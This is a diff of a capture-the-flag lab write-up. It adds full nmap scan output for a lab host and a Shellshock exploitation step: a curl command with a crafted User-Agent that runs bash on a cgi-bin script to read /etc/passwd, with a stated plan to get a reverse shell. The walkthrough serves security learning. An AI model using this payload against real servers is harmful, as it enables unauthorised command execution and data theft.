@@ -10,6 +10,60 @@ Lets get started
 
 command:```sudo nmap -A 192.168.212.87 -T4  -v -p-```
 
+```
+# Nmap 7.93 scan initiated Sat Jun 24 13:51:06 2023 as: nmap -A -T4 -v -p- -oN sumo 192.168.212.87
+Increasing send delay for 192.168.212.87 from 0 to 5 due to 752 out of 1879 dropped probes since last increase.
+Increasing send delay for 192.168.212.87 from 5 to 10 due to 17 out of 42 dropped probes since last increase.
+Warning: 192.168.212.87 giving up on port because retransmission cap hit (6).
+Nmap scan report for 192.168.212.87
+Host is up (0.21s latency).
+Not shown: 65527 closed tcp ports (reset)
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 06cb9ea3aff01048c417934a2c45d948 (DSA)
+|   2048 b7c5427bbaae9b9b7190e747b4a4de5a (RSA)
+|_  256 fa81cd002d52660b70fcb840fadb1830 (ECDSA)
+80/tcp    open     http    Apache httpd 2.2.22 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+10604/tcp filtered unknown
+20429/tcp filtered unknown
+20820/tcp filtered unknown
+21802/tcp filtered unknown
+27692/tcp filtered unknown
+41664/tcp filtered unknown
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.93%E=4%D=6/24%OT=22%CT=1%CU=40015%PV=Y%DS=4%DC=T%G=Y%TM=6496EC0
+OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=Z%II=I%TS=8)OPS(O1=M
+OS:54EST11NW5%O2=M54EST11NW5%O3=M54ENNT11NW5%O4=M54EST11NW5%O5=M54EST11NW5%
+OS:O6=M54EST11)WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)ECN(R=Y%
+OS:DF=Y%T=40%W=3908%O=M54ENNSNW5%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=
+OS:0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+OS:T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=B3
+OS:60%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Uptime guess: 0.356 days (since Sat Jun 24 05:41:12 2023)
+Network Distance: 4 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 23/tcp)
+HOP RTT       ADDRESS
+1   293.00 ms 192.168.45.1
+2   292.98 ms 192.168.45.254
+3   293.02 ms 192.168.251.1
+4   293.06 ms 192.168.212.87
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jun 24 14:13:36 2023 -- 1 IP address (1 host up) scanned in 1350.43 seconds
+```
+
 From our scan we can see we have 2 open ports. Port 22 which runs ssh and port 80 which runs http. Our enumeration today will be focused on port 80.
 
 
@@ -129,7 +183,33 @@ Cool stuff right??😎
 
 # Exploitation
 
-We'll be using burpsuite to capture our web requests
+I'll be using the ```curl``` command to do this
+
+payload:```() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"```
+
+With this, we'll try to view the ```/etc/passwd``` file
+
+command:```curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \http://192.168.170.87/cgi-bin/test```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b440fc1c-951c-4ead-8f7a-396ff7e87144)
+
+cool stuff hehe. Lets go ahead and get a reverse shell
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4b6e1f4d-ee32-4218-89c9-69b3399d08b5)
+
+As you can see from the above screenshot the command ```id``` and ```whoami``` works. So, we can leverage this to  get our reverse shell
+
+
+
+
+
+
+
+
+
+
+
+
 
 
   
